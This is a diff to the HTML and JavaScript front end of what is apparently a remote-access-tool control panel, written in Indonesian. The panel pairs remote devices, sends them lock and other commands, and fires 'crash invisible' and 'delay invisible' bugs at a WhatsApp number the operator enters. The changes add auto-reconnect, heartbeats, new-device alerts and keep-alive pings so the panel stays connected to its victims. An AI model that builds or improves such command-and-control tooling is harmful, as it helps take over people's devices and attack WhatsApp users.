@@ -7,7 +7,6 @@
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;-webkit-tap-highlight-color:transparent}
 
-/* ============ BACKGROUND GALAXY ============ */
 body{background:#000;color:#00ff88;min-height:100vh;overflow-x:hidden;position:relative}
 body::before{
   content:'';position:fixed;inset:0;
@@ -34,7 +33,6 @@ body::after{
 }
 @keyframes stars{from{background-position:0 0}to{background-position:800px 400px}}
 
-/* ============ GARIS TEBEL ============ */
 .thick-line{
   height:4px;border-radius:4px;margin:14px 0;
   background:linear-gradient(90deg, transparent, #00ff88, #00ccff, #00ff88, transparent);
@@ -45,7 +43,6 @@ body::after{
   box-shadow:0 0 15px #aa00ff, 0 0 30px #aa00ff;
 }
 
-/* ============ HEADER ============ */
 .header{
   display:flex;justify-content:space-between;align-items:center;
   padding:16px 20px;margin:16px;
@@ -60,7 +57,6 @@ body::after{
 .dot.off{background:#ff2244;box-shadow:0 0 12px #ff2244}
 @keyframes pulse{50%{opacity:.4}}
 
-/* ============ CARD ============ */
 .card{
   border:3px solid #00ff88;border-radius:14px;
   background:rgba(0,20,10,.55);backdrop-filter:blur(12px);
@@ -69,7 +65,6 @@ body::after{
 }
 .card h2{font-size:14px;letter-spacing:3px;margin-bottom:14px;text-transform:uppercase;text-shadow:0 0 8px #00ff88}
 
-/* ============ BUTTON ============ */
 button{
   background:linear-gradient(135deg, rgba(0,255,136,.15), rgba(0,200,255,.1));
   border:2px solid #00ff88;color:#00ff88;
@@ -92,7 +87,6 @@ button.danger{border-color:#ff2244;color:#ff2244;
   box-shadow:0 0 12px rgba(255,34,68,.4);}
 button.danger:hover{background:#ff2244;color:#000;box-shadow:0 0 25px #ff2244}
 
-/* ============ INPUT ============ */
 input, select, textarea{
   width:100%;background:rgba(0,0,0,.7);border:2px solid #00ff88;
   color:#00ff88;padding:12px 14px;border-radius:10px;
@@ -104,7 +98,6 @@ input:focus, select:focus, textarea:focus{
 }
 label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:.8;text-transform:uppercase}
 
-/* ============ CODE ============ */
 .code{
   flex:1;min-width:180px;background:#000;border:3px solid #00ff88;
   border-radius:12px;padding:16px;font-size:28px;letter-spacing:12px;
@@ -114,13 +107,17 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 }
 .row{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
 
-/* ============ DEVICE LIST ============ */
 .dlist{display:grid;gap:12px}
 .dcard{
   border:3px solid #00ff88;border-radius:12px;
   background:rgba(0,255,136,.05);
   padding:16px;display:flex;justify-content:space-between;align-items:center;
   transition:.25s;box-shadow:0 0 15px rgba(0,255,136,.25);
+  animation:slideIn .4s ease;
+}
+@keyframes slideIn{
+  from{transform:translateX(-20px);opacity:0}
+  to{transform:translateX(0);opacity:1}
 }
 .dcard:hover{background:rgba(0,255,136,.1);box-shadow:0 0 25px rgba(0,255,136,.6);transform:translateY(-2px)}
 .dinfo{display:flex;align-items:center;gap:14px}
@@ -128,7 +125,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .dmeta h3{font-size:14px;margin-bottom:4px;letter-spacing:1px}
 .dmeta p{font-size:11px;opacity:.6;letter-spacing:1px}
 
-/* ============ DASHBOARD ============ */
 .dgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:14px;padding:0 16px}
 .fcard{
   border:3px solid #00ff88;border-radius:12px;
@@ -144,7 +140,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .fbadge.on{background:#00ff88;color:#000}
 .fbadge.off{opacity:.4}
 
-/* ============ MODAL ============ */
 .mov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:1000;justify-content:center;align-items:center;padding:16px;backdrop-filter:blur(8px)}
 .mov.active{display:flex}
 .modal{
@@ -160,7 +155,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .tog.on{background:rgba(0,255,136,.3)}
 .tog.on::after{left:24px}
 
-/* ============ BOTTOM NAV ============ */
 .bottom-nav{
   position:fixed;bottom:0;left:0;right:0;
   display:flex;justify-content:space-around;align-items:center;
@@ -180,11 +174,9 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .nav-btn.wa svg{stroke:#25D366;fill:#25D366;filter:drop-shadow(0 0 8px #25D366)}
 .nav-btn.wa{color:#25D366}
 
-/* ============ PAGE ============ */
 .page{display:none;padding-bottom:100px}
 .page.active{display:block}
 
-/* ============ AUTH ============ */
 .auth-wrap{max-width:400px;margin:60px auto;padding:0 20px}
 .auth-box{
   border:3px solid #00ff88;border-radius:16px;
@@ -195,14 +187,12 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 .auth-title{font-size:24px;text-align:center;letter-spacing:6px;text-shadow:0 0 15px #00ff88;margin-bottom:8px;font-weight:900}
 .auth-sub{text-align:center;font-size:11px;opacity:.6;letter-spacing:3px;margin-bottom:20px}
 
-/* ============ LOADING ============ */
 .bug-loading{display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:2000;justify-content:center;align-items:center;flex-direction:column}
 .bug-loading.active{display:flex}
 .bug-spinner{width:80px;height:80px;border:6px solid rgba(0,255,136,.2);border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite;box-shadow:0 0 30px #00ff88}
 @keyframes spin{to{transform:rotate(360deg)}}
 .bug-text{margin-top:24px;font-size:14px;letter-spacing:4px;text-shadow:0 0 15px #00ff88;animation:pulse 1.2s infinite}
 
-/* ============ POPUP CUSTOM (GANTI ALERT) ============ */
 .popup{
   display:none;position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:3000;
   justify-content:center;align-items:center;padding:20px;backdrop-filter:blur(10px);
@@ -215,10 +205,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   box-shadow:0 0 60px rgba(0,255,136,.6), inset 0 0 40px rgba(0,255,136,.1);
   animation:popIn .4s cubic-bezier(.34,1.56,.64,1);
 }
-@keyframes popIn{
-  from{transform:scale(.7);opacity:0}
-  to{transform:scale(1);opacity:1}
-}
+@keyframes popIn{from{transform:scale(.7);opacity:0}to{transform:scale(1);opacity:1}}
 .popup-icon{
   width:90px;height:90px;margin:0 auto 18px;
   border:4px solid #00ff88;border-radius:50%;
@@ -228,10 +215,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   text-shadow:0 0 20px #00ff88;
   animation:glow 1.5s ease-in-out infinite alternate;
 }
-@keyframes glow{
-  from{box-shadow:0 0 30px #00ff88}
-  to{box-shadow:0 0 60px #00ff88, 0 0 90px #00ff88}
-}
+@keyframes glow{from{box-shadow:0 0 30px #00ff88}to{box-shadow:0 0 60px #00ff88, 0 0 90px #00ff88}}
 .popup-title{font-size:20px;letter-spacing:4px;text-shadow:0 0 15px #00ff88;margin-bottom:10px;font-weight:900}
 .popup-desc{font-size:12px;opacity:.7;letter-spacing:2px;margin-bottom:22px;line-height:1.5}
 .popup-btn{
@@ -242,18 +226,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 }
 .popup-btn:hover{transform:scale(1.05);box-shadow:0 0 40px #00ff88}
 
-/* ============ SUCCESS ANIMATION ============ */
-.bug-success{display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:2001;justify-content:center;align-items:center;flex-direction:column}
-.bug-success.active{display:flex}
-.success-icon{
-  width:100px;height:100px;border:6px solid #00ff88;border-radius:50%;
-  display:flex;justify-content:center;align-items:center;
-  font-size:50px;color:#00ff88;box-shadow:0 0 40px #00ff88;animation:pop .5s ease;
-}
-@keyframes pop{0%{transform:scale(0)}70%{transform:scale(1.15)}100%{transform:scale(1)}}
-.success-text{margin-top:24px;font-size:18px;letter-spacing:4px;text-shadow:0 0 20px #00ff88;font-weight:900}
-
-/* ============ WA BUG ============ */
 .wa-slider{display:flex;gap:12px;overflow-x:auto;padding:4px 0 20px;scrollbar-width:none}
 .wa-slider::-webkit-scrollbar{display:none}
 .wa-opt{
@@ -265,9 +237,34 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
 }
 .wa-opt.active{background:#25D366;color:#000;box-shadow:0 0 25px #25D366}
 .wa-opt:hover{transform:translateY(-2px)}
+
+/* STATUS BANNER */
+.status-banner{
+  position:fixed;top:0;left:0;right:0;
+  padding:8px 16px;
+  font-size:11px;letter-spacing:2px;
+  text-align:center;font-weight:bold;
+  z-index:10000;
+  transform:translateY(-100%);
+  transition:.3s;
+}
+.status-banner.show{transform:translateY(0)}
+.status-banner.online{background:#00ff88;color:#000}
+.status-banner.reconnect{background:#ffaa00;color:#000}
+.status-banner.offline{background:#ff2244;color:#fff}
+
+/* PULSE ANIMATION UNTUK NEW DEVICE */
+@keyframes highlight{
+  0%,100%{box-shadow:0 0 15px rgba(0,255,136,.25)}
+  50%{box-shadow:0 0 40px #00ff88, 0 0 80px #00ff88}
+}
+.dcard.new{animation:highlight 1s ease 3}
 </style>
 </head>
 <body>
+
+<!-- ============ STATUS BANNER ============ -->
+<div class="status-banner" id="statusBanner">STATUS</div>
 
 <!-- ============ PAGE: LOGIN ============ -->
 <div class="page active" id="pageAuth">
@@ -287,26 +284,21 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   </div>
 </div>
 
-<!-- ============ PAGE: REGISTER (HALAMAN KHUSUS) ============ -->
+<!-- ============ PAGE: REGISTER ============ -->
 <div class="page" id="pageRegister">
   <div class="auth-wrap">
     <div class="auth-box">
       <div class="auth-title">CREATE ACCOUNT</div>
       <div class="auth-sub">DAFTAR AKUN BARU</div>
       <div class="thick-line purple"></div>
-
       <label>Username</label>
       <input type="text" id="regUser" placeholder="username baru">
-
       <label>Password</label>
       <input type="password" id="regPass" placeholder="password">
-
       <label>Konfirmasi Password</label>
       <input type="password" id="regPass2" placeholder="ulangi password">
-
       <button style="width:100%;margin-top:22px" onclick="doRegister()">BUAT ACCOUNT</button>
       <button style="width:100%;margin-top:10px" class="danger" onclick="goPage('auth')">KEMBALI</button>
-
       <div class="thick-line"></div>
     </div>
   </div>
@@ -327,6 +319,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
     <div class="trow"><span>Status</span><span style="color:#0ff;font-weight:bold">PREMIUM</span></div>
     <div class="trow"><span>Role</span><span style="color:#0ff;font-weight:bold">ADMIN</span></div>
     <div class="trow"><span>Server</span><span>Railway</span></div>
+    <div class="trow"><span>Koneksi</span><span id="infoConn" style="color:#ffaa00;font-weight:bold">-</span></div>
     <div class="trow"><span>Login Terakhir</span><span id="infoLast">-</span></div>
     <div class="thick-line"></div>
     <button class="danger" style="width:100%" onclick="doLogout()">LOGOUT</button>
@@ -353,10 +346,10 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
     </div>
   </div>
   <div class="card">
-    <h2>Device List</h2>
+    <h2>Device List <span style="font-size:11px;opacity:.5" id="devCount">(0)</span></h2>
     <div class="thick-line"></div>
     <div class="dlist" id="dlist">
-      <p style="opacity:.4;font-size:12px;padding:8px;letter-spacing:1px">Belum ada device terpairing.</p>
+      <p style="opacity:.4;font-size:12px;padding:8px;letter-spacing:1px">Menunggu device terpairing...</p>
     </div>
     <button style="width:100%;margin-top:12px" onclick="refreshDev()">REFRESH DEVICE</button>
   </div>
@@ -385,7 +378,7 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   <div class="card">
     <h2>Target Nomor WhatsApp</h2>
     <div class="thick-line"></div>
-    <label>Nomor Target (contoh: 628123456789)</label>
+    <label>Nomor Target</label>
     <input type="tel" id="waNumber" placeholder="628xxxxxxxxxx">
   </div>
   <div class="card">
@@ -398,7 +391,6 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
       <div class="wa-opt" onclick="selBug(this,'crashinv')">CRASH INVISIBLE</div>
       <div class="wa-opt" onclick="selBug(this,'delayinv')">DELAY INVISIBLE</div>
     </div>
-    <p style="font-size:10px;opacity:.5;letter-spacing:1px;margin-top:10px">Geser → tap untuk pilih bug</p>
   </div>
   <div class="card">
     <button class="warn" style="width:100%;font-size:14px;padding:18px" onclick="sendBug()">KIRIM BUG</button>
@@ -427,12 +419,12 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   <div class="bug-text">MENGIRIM BUG...</div>
 </div>
 
-<div class="bug-success" id="bugSuccess">
-  <div class="success-icon">✓</div>
-  <div class="success-text">BUG SUKSES DIKIRIM</div>
+<div class="bug-success" id="bugSuccess" style="display:none;position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:2001;justify-content:center;align-items:center;flex-direction:column">
+  <div style="width:100px;height:100px;border:6px solid #00ff88;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:50px;color:#00ff88;box-shadow:0 0 40px #00ff88">✓</div>
+  <div style="margin-top:24px;font-size:18px;letter-spacing:4px;text-shadow:0 0 20px #00ff88;font-weight:900">BUG SUKSES DIKIRIM</div>
 </div>
 
-<!-- ============ POPUP CUSTOM ============ -->
+<!-- ============ POPUP ============ -->
 <div class="popup" id="popup">
   <div class="popup-box">
     <div class="popup-icon" id="popupIcon">✓</div>
@@ -442,13 +434,16 @@ label{display:block;font-size:11px;letter-spacing:2px;margin:14px 0 6px;opacity:
   </div>
 </div>
 
-<!-- ============ MODAL FEATURE ============ -->
+<!-- ============ MODAL ============ -->
 <div class="mov" id="mov"><div class="modal" id="modal"></div></div>
 
 <script>
 /* ============ STATE ============ */
 const S = {
   ws:null, pairCode:'', devices:[], active:null, waBug:'',
+  reconnectDelay:1000,
+  maxReconnectDelay:10000,
+  wsHeartbeat:null,
   user: localStorage.getItem('lyx_user') || '',
   f:{
     lock:{active:false,pin:''},
@@ -476,6 +471,14 @@ window.addEventListener('load', () => {
     goPage('auth');
   }
 });
+
+/* ============ STATUS BANNER ============ */
+function showBanner(text, type){
+  const b = document.getElementById('statusBanner');
+  b.textContent = text;
+  b.className = 'status-banner show ' + type;
+  setTimeout(() => { b.classList.remove('show'); }, 2500);
+}
 
 /* ============ POPUP ============ */
 function showPopup(icon, title, desc){
@@ -509,20 +512,13 @@ function doRegister(){
   const u = document.getElementById('regUser').value.trim();
   const p = document.getElementById('regPass').value.trim();
   const p2 = document.getElementById('regPass2').value.trim();
-
   if (!u || !p){ showPopup('!','GAGAL','Isi semua field dulu'); return; }
   if (p !== p2){ showPopup('!','GAGAL','Password gak sama'); return; }
-
   localStorage.setItem('lyx_user', u);
   localStorage.setItem('lyx_pass', p);
   localStorage.setItem('lyx_last', new Date().toLocaleString());
-
-  // popup YEY ACCOUNT SUDAH DI BUAT
-  showPopup('✓', 'YEY ACCOUNT SUDAH DI BUAT', 'Selamat datang, ' + u + '! Akun berhasil dibuat.');
-
+  showPopup('✓','YEY ACCOUNT SUDAH DI BUAT','Selamat datang, ' + u + '!');
   S.user = u;
-  document.getElementById('infoUser').textContent = u;
-
   setTimeout(() => {
     closePopup();
     showBottomNav();
@@ -552,6 +548,7 @@ function goPage(name){
     document.getElementById('navBeranda').classList.add('active');
     document.getElementById('infoUser').textContent = S.user || '-';
     document.getElementById('infoLast').textContent = localStorage.getItem('lyx_last') || '-';
+    document.getElementById('infoConn').textContent = (S.ws && S.ws.readyState === 1) ? 'ONLINE' : 'OFFLINE';
   } else if (name === 'rat'){
     document.getElementById('pageRat').classList.add('active');
     document.getElementById('navRat').classList.add('active');
@@ -561,20 +558,79 @@ function goPage(name){
   }
 }
 
-/* ============ WS ============ */
+/* ============ WS — AUTO RECEIVE + AUTO RECONNECT ============ */
 function connectWS(){
   if (S.ws && S.ws.readyState === 1) return;
+  if (S.ws && S.ws.readyState === 0) return;
+
   const proto = location.protocol === 'https:' ? 'wss' : 'ws';
-  S.ws = new WebSocket(proto + '://' + location.host);
-  S.ws.onopen = () => { dot(true); S.ws.send(JSON.stringify({type:'panel_hello'})); };
-  S.ws.onclose = () => { dot(false); setTimeout(connectWS, 3000); };
+  try {
+    S.ws = new WebSocket(proto + '://' + location.host);
+  } catch(e){
+    scheduleReconnect();
+    return;
+  }
+
+  S.ws.onopen = () => {
+    S.reconnectDelay = 1000;
+    dot(true);
+    showBanner('PANEL ONLINE', 'online');
+    S.ws.send(JSON.stringify({type:'panel_hello'}));
+
+    // Heartbeat tiap 20 detik biar koneksi gak mati
+    if (S.wsHeartbeat) clearInterval(S.wsHeartbeat);
+    S.wsHeartbeat = setInterval(() => {
+      if (S.ws && S.ws.readyState === 1){
+        try { S.ws.send(JSON.stringify({type:'ping'})); } catch(e){}
+      }
+    }, 20000);
+  };
+
+  S.ws.onclose = () => {
+    dot(false);
+    showBanner('RECONNECTING...', 'reconnect');
+    if (S.wsHeartbeat){ clearInterval(S.wsHeartbeat); S.wsHeartbeat = null; }
+    scheduleReconnect();
+  };
+
+  S.ws.onerror = () => {
+    // biarin onclose yang handle
+  };
+
   S.ws.onmessage = (e) => {
     let m; try{ m = JSON.parse(e.data); }catch{ return; }
-    if (m.type === 'device_list'){ S.devices = m.devices || []; renderDev(); }
-    if (m.type === 'device_paired'){ S.devices.push(m.device); renderDev(); }
-    if (m.type === 'device_offline'){ S.devices = S.devices.filter(d => d.id !== m.deviceId); renderDev(); }
+
+    if (m.type === 'device_list'){
+      // replace semua device
+      S.devices = m.devices || [];
+      renderDev();
+    }
+    else if (m.type === 'device_paired'){
+      // AUTO RECEIVE — device baru langsung muncul
+      const exists = S.devices.find(d => d.id === m.device.id);
+      if (!exists){
+        S.devices.push(m.device);
+        renderDev(true, m.device.id);
+        showBanner('DEVICE BARU: ' + m.device.name, 'online');
+      }
+    }
+    else if (m.type === 'device_offline'){
+      S.devices = S.devices.filter(d => d.id !== m.deviceId);
+      renderDev();
+    }
+    else if (m.type === 'agent_event'){
+      console.log('[AGENT]', m.payload);
+    }
   };
 }
+
+function scheduleReconnect(){
+  setTimeout(() => {
+    connectWS();
+    S.reconnectDelay = Math.min(S.reconnectDelay * 2, S.maxReconnectDelay);
+  }, S.reconnectDelay);
+}
+
 function dot(on){
   const d = document.getElementById('wsDot');
   if (!d) return;
@@ -597,25 +653,34 @@ function copyCode(){
 
 /* ============ DEVICE LIST ============ */
 async function refreshDev(){
-  const r = await fetch('/api/devices');
-  const j = await r.json();
-  S.devices = j.devices || [];
-  renderDev();
+  try {
+    const r = await fetch('/api/devices');
+    const j = await r.json();
+    S.devices = j.devices || [];
+    renderDev();
+  } catch(e){}
 }
-function renderDev(){
+
+function renderDev(highlightNew, newId){
   const l = document.getElementById('dlist');
+  const c = document.getElementById('devCount');
+  if (c) c.textContent = '(' + S.devices.length + ')';
+
   if (S.devices.length === 0){
-    l.innerHTML = '<p style="opacity:.4;font-size:12px;padding:8px;letter-spacing:1px">Belum ada device terpairing.</p>';
+    l.innerHTML = '<p style="opacity:.4;font-size:12px;padding:8px;letter-spacing:1px">Menunggu device terpairing...</p>';
     return;
   }
-  l.innerHTML = S.devices.map((d, i) => `
-    <div class="dcard">
+  l.innerHTML = S.devices.map((d, i) => {
+    const isNew = highlightNew && d.id === newId;
+    return `
+    <div class="dcard ${isNew ? 'new' : ''}">
       <div class="dinfo">
         <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="2"/><circle cx="12" cy="18" r="1"/></svg>
         <div class="dmeta"><h3>${d.name}</h3><p>ID: ${d.id} • ${d.os}</p></div>
       </div>
       <button onclick="openDash(${i})">OPEN</button>
-    </div>`).join('');
+    </div>`;
+  }).join('');
 }
 
 /* ============ DASHBOARD ============ */
@@ -740,17 +805,15 @@ function apply(k){
 /* ============ SEND ============ */
 async function send(feature, data){
   if (!S.active) return;
-  await fetch('/api/command', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({device: S.active.id, feature, data})
-  });
+  try {
+    await fetch('/api/command', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({device: S.active.id, feature, data})
+    });
+  } catch(e){}
 }
 
 /* ============ PREVIEW ============ */
-async function startCam(){
-  stopPrev();
-  try{ camStream = await navigator.mediaDevices.getUserMedia({video:true}); }catch(e){}
-}
 function stopPrev(){
   camStream?.getTracks().forEach(t => t.stop()); camStream = null;
 }
@@ -761,32 +824,31 @@ function selBug(el, name){
   el.classList.add('active');
   S.waBug = name;
 }
-
 async function sendBug(){
   const num = document.getElementById('waNumber').value.trim();
   if (!num){ showPopup('!','GAGAL','Masukin nomor WA target dulu'); return; }
   if (!S.waBug){ showPopup('!','GAGAL','Pilih jenis bug dulu'); return; }
   if (!S.active){ showPopup('!','GAGAL','Belum ada device terpairing'); return; }
-
   document.getElementById('bugLoading').classList.add('active');
-
-  await fetch('/api/command', {
-    method:'POST', headers:{'Content-Type':'application/json'},
-    body: JSON.stringify({
-      device: S.active.id,
-      feature: 'wabug',
-      data: { active:true, number: num, bug: S.waBug }
-    })
-  });
-
+  await send('wabug', {active:true, number:num, bug:S.waBug});
   setTimeout(() => {
     document.getElementById('bugLoading').classList.remove('active');
-    document.getElementById('bugSuccess').classList.add('active');
-    setTimeout(() => {
-      document.getElementById('bugSuccess').classList.remove('active');
-    }, 2500);
+    const bs = document.getElementById('bugSuccess');
+    bs.style.display = 'flex';
+    setTimeout(() => { bs.style.display = 'none'; }, 2500);
   }, 4000);
 }
+
+/* ============ AUTO REFRESH DEVICE LIST ============ */
+setInterval(() => {
+  if (S.ws && S.ws.readyState === 1) return;
+  refreshDev();
+}, 15000);
+
+/* ============ PING SERVER TIAP 25 DETIK (keep alive Railway) ============ */
+setInterval(() => {
+  fetch('/api/devices').catch(() => {});
+}, 25000);
 </script>
 </body>
 </html>
